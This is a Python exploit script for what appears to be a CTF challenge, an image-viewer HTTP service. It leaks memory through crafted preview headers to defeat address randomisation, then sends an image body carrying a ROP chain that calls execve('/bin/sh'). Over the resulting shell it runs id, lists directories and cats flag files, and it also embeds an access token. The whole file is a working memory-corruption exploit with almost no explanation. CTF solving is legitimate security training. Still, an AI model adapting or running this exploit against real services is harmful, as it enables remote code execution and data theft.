#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ctfcup image-viewer exploit, wrapper-aware (prompt -> token -> HTTP)."""
import socket, struct, sys, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "instances.ctfcup.online"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
TOKEN = sys.argv[3] if len(sys.argv) > 3 else "BTG0ZSUL8I78E6C0M650RT6ZIXAS7M3Z"

W = H = 4
S = W * H * 3
BLEN = 18 + 1 + 384
LVT, LRET, PRDI, PRSI, PRAX, SYSC = 0x206db8, 0xcf7b1, 0x1cca4, 0x239af, 0x3b4aa, 0x155ed5
MODE = None            # "polite" | "batched"


def req(gamma, payload):
    p = struct.pack("<BBBHHBHHHHBB", 0, 0, 10, 0, 0, 0, 0, 0, W, H, 24, 0) + payload
    p += b"\x00" * (BLEN - len(p))
    p = p[:BLEN]
    return ("POST /process HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n"
            "X-Filter: warm\r\nX-Preview-Size: %d\r\nX-Preview-Offset: 0\r\n"
            "X-Preview-Length: 1024\r\nX-Preview-Depth: 2000000000\r\n"
            "X-Scale: 1\r\nX-Gamma: %s\r\n\r\n" % (BLEN, S, gamma)).encode() + p


def rd(s, wait, read_all=True):
    s.settimeout(wait)
    out = b""
    while read_all:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        out += d
    return out


def talk(head, mode=None, wait=8.0, read_all=True):
    """Open a connection, perform the wrapper handshake, send `head`."""
    mode = mode or MODE or "polite"
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(8)
    if mode == "polite":
        rd(s, 3.0)                       # "[*] Please, enter token:\n> "
        s.sendall(TOKEN.encode() + b"\r\n")
        rd(s, 3.0)                       # "[+] Connecting...\n"
    elif mode == "batched":
        s.sendall(TOKEN.encode() + b"\r\n")
    s.sendall(head)
    return s, rd(s, wait, read_all)


def detect():
    global MODE
    for mode in ("polite", "batched"):
        for rnd in range(2):
            try:
                s, out = talk(req("0", bytes([127 + 16]) + b"\x11\x22\x33"), mode, 6.0)
                s.close()
            except OSError as e:
                print("    %-7s round %d -> %s" % (mode, rnd, e))
                time.sleep(1.0)
                continue
            ok = b"HTTP/" in out
            print("    %-7s round %d -> %d B%s" % (mode, rnd, len(out),
                                                   "  " + repr(out[:90]) if not ok else "  OK"))
            if ok:
                MODE = mode
                return True
            time.sleep(1.2)
    return False


def leak():
    s, out = talk(req("0", bytes([127 + 16]) + b"\x11\x22\x33"), MODE, 10.0)
    s.close()
    _, _, d = out.partition(b"\r\n\r\n")
    if len(d) < 0x100:
        raise SystemExit("no preview data: %r" % out[-160:])
    for o in range(0, len(d) - 0x20, 8):
        vt = struct.unpack_from("<Q", d, o)[0]
        if vt < 0x1000:
            continue
        pie = vt - LVT
        if pie % 0x1000 == 0 and 0x40000000 <= pie < 0x800000000000:
            view, temp = struct.unpack_from("<QQ", d, o + 8)
            if view and temp and 0 < temp - view < 0x1000:
                return pie, view, view + o, temp


def main():
    print("[*] %s:%d" % (HOST, PORT))
    print("[*] handshake:")
    if not detect():
        print("[!] no answer.  The instance looks down / locked / needs a fresh token.")
        return 1
    print("[+] handshake mode:", MODE)
    pie, view, F, temp = leak()
    print("[+] pie=%#x view=%#x temp=%#x filter=%#x" % (pie, view, temp, F))
    d = F - temp
    if not 0x40 <= d <= 0x100:
        print("[!] unexpected layout delta=%#x" % d)
        return 2
    b = bytearray(b"\x90" * 384)

    def put(o, v):
        struct.pack_into("<Q", b, o, v)

    put(d + 0x00, F + 0x100)
    put(d + 0x08, pie + PRDI)
    put(d + 0x10, F + 0x120)
    put(d + 0x18, pie + PRSI)
    put(d + 0x20, 0)
    put(d + 0x28, pie + PRAX)
    put(d + 0x30, 59)
    put(d + 0x38, pie + SYSC)
    put(d + 0x110, pie + LRET)
    b[d + 0x120:d + 0x128] = b"/bin/sh\x00"
    s, first = talk(req("0", bytes([127]) + bytes(b)), MODE, 3.0, read_all=False)
    print("[+] payload sent.")
    time.sleep(0.5)
    s.sendall(b"echo ---PWNED---; id; ls /; ls /app /home 2>/dev/null; "
              b"cat /flag /flag.txt /app/flag /app/flag.txt /home/*/flag* 2>/dev/null\n")
    time.sleep(2.0)
    out = first + rd(s, 3.0)
    s.close()
    txt = out.decode("latin1", "replace")
    print(txt)
    return 0 if "PWNED" in txt else 3


sys.exit(main())
